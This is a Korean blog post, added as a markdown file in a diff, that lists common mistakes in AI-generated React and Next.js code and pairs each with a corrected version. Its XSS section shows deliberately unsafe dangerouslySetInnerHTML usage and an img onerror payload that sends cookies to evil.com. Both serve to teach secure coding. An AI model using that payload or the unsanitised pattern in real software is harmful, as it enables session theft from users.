@@ -1,0 +1,356 @@
+---
+title: "\"AI 코딩 실수 모음\" — AI가 만든 코드의 함정"
+date: "미정"
+series: "AI시대생존법"
+tags: ["AI","기술스택"]
+description: "\"AI 코딩 실수 모음\" — AI가 만든 코드의 함정"
+slug: "30-e9-ai코딩실수모음"
+---
+
+> 커리어렌즈 · 🤖 AI 시대 생존법 시리즈
+> 실제 사례 기반 AI 코딩 함정 + Stack Overflow 2024 신뢰도 데이터
+
+---
+
+## 들어가며
+
+이전 편에서 "AI로 코딩하면 55% 빨라진다"고 했는데요. 맞는 얘기입니다. **그런데 빠른 만큼 실수도 빠르게 만들어냅니다.**
+
+AI가 만든 코드가 겉보기에는 완벽한데, 실제로 돌려보면 문제가 터지는 경우가 많아요. Stack Overflow 2024 설문에서도 개발자의 **31%가 AI 출력을 신뢰하지 않는다**고 답했고, **45%가 "AI는 복잡한 작업을 잘 못한다"**고 했습니다.
+
+> 📎 출처: [Stack Overflow 2024 Developer Survey — AI](https://survey.stackoverflow.co/2024/ai)
+
+왜 그런지, **프론트엔드 개발에서 자주 발생하는 AI 코딩 실수 패턴**을 정리해봤습니다.
+
+---
+
+## 실수 1: "돌아가기는 하는데, 성능이 망한" 코드
+
+### 사례: 무한 리렌더링 컴포넌트
+
+AI에게 "사용자 목록을 필터링하는 컴포넌트 만들어줘"라고 하면 이런 코드가 나올 수 있어요:
+
+```jsx
+function UserList({ users }) {
+  const [filter, setFilter] = useState('');
+  
+  // AI가 만든 코드: 매 렌더링마다 새 배열 생성
+  const filteredUsers = users.filter(u => 
+    u.name.includes(filter)
+  );
+  
+  // 문제: filteredUsers가 매번 새 참조 → 하위 컴포넌트 전부 리렌더링
+  return (
+    <div>
+      <input onChange={e => setFilter(e.target.value)} />
+      {filteredUsers.map(user => (
+        <UserCard key={user.id} user={user} />
+      ))}
+    </div>
+  );
+}
+```
+
+겉보기에는 완벽합니다. 돌아가기도 해요. 그런데 유저가 1000명이면? **매 키 입력마다 1000개 컴포넌트가 리렌더링**됩니다.
+
+### 제대로 된 코드
+
+```jsx
+function UserList({ users }) {
+  const [filter, setFilter] = useState('');
+  
+  // useMemo로 불필요한 재계산 방지
+  const filteredUsers = useMemo(
+    () => users.filter(u => u.name.includes(filter)),
+    [users, filter]
+  );
+  
+  return (
+    <div>
+      <input onChange={e => setFilter(e.target.value)} />
+      {filteredUsers.map(user => (
+        <MemoizedUserCard key={user.id} user={user} />
+      ))}
+    </div>
+  );
+}
+
+const MemoizedUserCard = memo(UserCard);
+```
+
+**AI가 놓치는 이유**: AI는 "동작하는 코드"를 만들지, "최적화된 코드"를 만들지 않습니다. 성능은 맥락(데이터 크기, 렌더링 빈도)에 달려있는데, AI는 그 맥락을 모르거든요.
+
+---
+
+## 실수 2: "존재하지 않는 API"를 자신있게 사용
+
+### 사례: 없는 라이브러리 함수 호출
+
+AI에게 "React Query로 무한 스크롤 구현해줘"라고 하면:
+
+```jsx
+import { useInfiniteScroll } from '@tanstack/react-query';
+// ❌ 이런 hook은 존재하지 않습니다
+
+function ProductList() {
+  const { data, loadMore } = useInfiniteScroll('/api/products');
+  // ...
+}
+```
+
+AI가 **없는 함수를 실제로 있는 것처럼** 코드에 넣어버리는 경우가 흔합니다. 이걸 "환각(Hallucination)"이라고 하는데, AI 코딩에서 가장 위험한 패턴이에요.
+
+### 왜 위험한가
+
+- 코드 에디터에서는 에러가 안 보일 수 있음 (타입 정의가 없으니)
+- 빌드할 때야 에러 발견
+- 초보자는 "내가 뭔가 잘못 설치한 건가?" 하고 삽질
+
+### 진짜 코드
+
+```jsx
+import { useInfiniteQuery } from '@tanstack/react-query';
+
+function ProductList() {
+  const { data, fetchNextPage, hasNextPage } = useInfiniteQuery({
+    queryKey: ['products'],
+    queryFn: ({ pageParam = 1 }) => fetchProducts(pageParam),
+    getNextPageParam: (lastPage) => lastPage.nextCursor,
+  });
+  // ...
+}
+```
+
+**대처법**: AI가 만든 코드의 import문을 항상 확인하세요. 라이브러리 공식 문서와 대조하는 습관이 필수입니다.
+
+---
+
+## 실수 3: "보안 구멍이 뻥 뚫린" 코드
+
+### 사례: XSS 취약점
+
+AI에게 "사용자가 입력한 HTML을 렌더링해줘"라고 하면:
+
+```jsx
+function UserComment({ comment }) {
+  // AI가 순순히 만들어주는 코드
+  return <div dangerouslySetInnerHTML={{ __html: comment.body }} />;
+}
+```
+
+React가 `dangerouslySetInnerHTML`이라고 **이름에 "dangerous"를 넣어놓은 이유**가 있습니다. 사용자 입력을 검증 없이 HTML로 렌더링하면 XSS(크로스 사이트 스크립팅) 공격에 완전히 노출돼요.
+
+누군가 댓글에 이걸 입력하면:
+
+```html
+<img src="x" onerror="document.location='https://evil.com/steal?cookie='+document.cookie" />
+```
+
+다른 사용자의 쿠키가 탈취됩니다.
+
+### 안전한 코드
+
+```jsx
+import DOMPurify from 'dompurify';
+
+function UserComment({ comment }) {
+  // 반드시 sanitize
+  const cleanHTML = DOMPurify.sanitize(comment.body);
+  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
+}
+```
+
+**AI가 놓치는 이유**: "HTML을 렌더링해줘"라고 하면, AI는 시키는 대로 합니다. "이게 보안에 위험한데 괜찮을까요?"라고 되묻지 않아요.
+
+---
+
+## 실수 4: "접근성(a11y)이 완전히 무시된" UI
+
+### 사례: 클릭 가능한 div
+
+AI에게 "카드를 클릭하면 상세 페이지로 이동하게 해줘"라고 하면:
+
+```jsx
+// AI가 흔히 만드는 코드
+<div onClick={() => navigate(`/product/${id}`)} className="card">
+  <img src={image} />
+  <h3>{title}</h3>
+  <p>{price}원</p>
+</div>
+```
+
+눈으로는 완벽합니다. 마우스로 클릭하면 잘 됩니다. 그런데:
+
+- **키보드 사용자**: Tab으로 이동 불가, Enter로 클릭 불가
+- **스크린 리더**: "이건 클릭할 수 있는 요소"라고 인식 못함
+- **접근성 점수**: 뚝 떨어짐
+
+### 접근성을 지킨 코드
+
+```jsx
+// 링크로 이동하는 거면 a 태그 사용
+<a href={`/product/${id}`} className="card">
+  <img src={image} alt={`${title} 상품 이미지`} />
+  <h3>{title}</h3>
+  <p>{price}원</p>
+</a>
+
+// 또는 버튼 동작이라면 button 사용
+<button onClick={handleClick} className="card">
+  ...
+</button>
+```
+
+**AI가 놓치는 이유**: AI는 "동작"을 요청받으면 가장 간단한 방법(div + onClick)을 선택합니다. 시멘틱 HTML이나 접근성은 별도로 요청하지 않으면 잘 챙기지 않아요.
+
+---
+
+## 실수 5: "오래된 버전의 코드"를 최신인 척
+
+### 사례: Next.js Pages Router를 App Router인 척
+
+AI에게 "Next.js로 서버 사이드 렌더링 해줘"라고 하면:
+
+```jsx
+// AI가 만든 코드: Pages Router (구버전)
+export async function getServerSideProps() {
+  const res = await fetch('https://api.example.com/data');
+  const data = await res.json();
+  return { props: { data } };
+}
+
+export default function Page({ data }) {
+  return <div>{data.title}</div>;
+}
+```
+
+이 코드 자체는 틀리지 않아요. 하지만 Next.js 14/15 App Router를 쓰고 있다면 **완전히 다른 패턴**이 필요합니다:
+
+```jsx
+// App Router (현재)
+async function Page() {
+  const res = await fetch('https://api.example.com/data');
+  const data = await res.json();
+  return <div>{data.title}</div>;
+}
+
+export default Page;
+```
+
+**AI가 놓치는 이유**: AI의 학습 데이터에는 오래된 코드가 더 많습니다. Pages Router 예시가 인터넷에 훨씬 많으니까요. 프로젝트에서 어떤 버전을 쓰는지 맥락을 안 주면, 가장 "흔한" 코드를 만들어냅니다.
+
+---
+
+## 실수 6: "에러 처리가 없는" 행복 경로 코드
+
+### 사례: API 호출 에러 무시
+
+```jsx
+// AI가 만든 코드: happy path만 있음
+function UserProfile({ userId }) {
+  const [user, setUser] = useState(null);
+  
+  useEffect(() => {
+    fetch(`/api/users/${userId}`)
+      .then(res => res.json())
+      .then(data => setUser(data));
+  }, [userId]);
+  
+  return <div>{user.name}</div>; // user가 null이면? 💥
+}
+```
+
+문제점:
+- 네트워크 에러 시? → 앱 멈춤
+- API가 404 반환하면? → undefined 접근으로 크래시
+- 로딩 중에? → `Cannot read property 'name' of null`
+
+### 현실적인 코드
+
+```jsx
+function UserProfile({ userId }) {
+  const [user, setUser] = useState(null);
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState(null);
+  
+  useEffect(() => {
+    setLoading(true);
+    fetch(`/api/users/${userId}`)
+      .then(res => {
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        return res.json();
+      })
+      .then(data => setUser(data))
+      .catch(err => setError(err.message))
+      .finally(() => setLoading(false));
+  }, [userId]);
+  
+  if (loading) return <Skeleton />;
+  if (error) return <ErrorMessage message={error} />;
+  if (!user) return null;
+  
+  return <div>{user.name}</div>;
+}
+```
+
+**AI가 놓치는 이유**: "프로필 보여줘"라고 하면 프로필을 보여주는 코드를 만듭니다. "프로필을 못 가져올 때"는 요청하지 않으면 안 만들어요.
+
+---
+
+## 실수 패턴 요약
+
+| 실수 유형 | 위험도 | 발생 빈도 | 대처법 |
+|-----------|--------|-----------|--------|
+| 성능 미최적화 | 중간 | 매우 높음 | 데이터 크기 고려, useMemo/memo 검토 |
+| 없는 API 사용 | 높음 | 높음 | import문 확인, 공식 문서 대조 |
+| 보안 취약점 | 매우 높음 | 중간 | 사용자 입력 sanitize, dangerouslySetInnerHTML 경계 |
+| 접근성 무시 | 중간 | 매우 높음 | 시멘틱 HTML, 키보드 테스트 |
+| 구버전 코드 | 중간 | 높음 | 버전 명시, 최신 문서 확인 |
+| 에러 처리 누락 | 높음 | 매우 높음 | 에러/로딩/빈 상태 항상 고려 |
+
+---
+
+## AI 코드 리뷰 체크리스트
+
+AI가 만든 코드를 받으면, 아래를 확인하세요:
+
+### 즉시 확인
+- [ ] **import문이 실제 존재하는가?** — 라이브러리 문서 대조
+- [ ] **버전이 맞는가?** — 프로젝트 버전과 코드 패턴 일치 여부
+- [ ] **사용자 입력을 그대로 쓰지 않는가?** — XSS, injection 확인
+
+### 동작 확인
+- [ ] **에러 상태 처리가 있는가?** — 네트워크 에러, 빈 데이터, null
+- [ ] **로딩 상태가 있는가?** — 비동기 데이터 처리
+- [ ] **키보드로 조작 가능한가?** — Tab, Enter, Escape
+
+### 성능 확인
+- [ ] **불필요한 리렌더링은 없는가?** — React DevTools Profiler
+- [ ] **데이터 크기가 커지면 괜찮은가?** — 10개 → 1000개 상상해보기
+
+---
+
+## 결론: AI를 의심하는 습관
+
+"AI가 만든 코드니까 괜찮겠지" — 이게 가장 위험한 생각입니다.
+
+Stack Overflow 설문에서 **개발자의 43%만 AI 출력을 신뢰한다**고 답한 데는 이유가 있어요. 나머지 57%는 경험으로 배운 겁니다.
+
+**AI는 "그럴싸한 코드"를 만드는 데 천재적이에요.** 문법이 맞고, 실행이 되고, 겉보기에 깔끔합니다. 하지만:
+
+- 성능? 맥락을 몰라서 최적화 못함
+- 보안? 시키는 대로 할 뿐
+- 접근성? 요청 안 하면 무시
+- 에러 처리? 행복 경로만 만듦
+
+**AI의 코드를 "초안"으로 받아들이고, "완성"은 내가 한다** — 이 마인드셋이면 AI 코딩 실수를 대부분 잡을 수 있습니다.
+
+코드를 검증하는 능력. 이게 AI 시대에 개발자의 진짜 경쟁력입니다.
+
+---
+
+> 📊 설문 데이터: Stack Overflow 2024 Developer Survey
+> 코드 사례는 프론트엔드 개발에서 자주 발생하는 패턴을 기반으로 재구성했습니다.
+
+> 💡 이전 편: ["AI로 코딩하면 진짜 빨라질까?" — 생산성 데이터 팩트체크](/posts/2026-02-28_29_E8_AI생산성팩트체크/blog.md)
+> 💡 시리즈 처음부터 읽기: ["프론트엔드인데 왜 AI를 요구하나요?"](/posts/2026-02-27_08_A5_프론트엔드AI/blog.md)
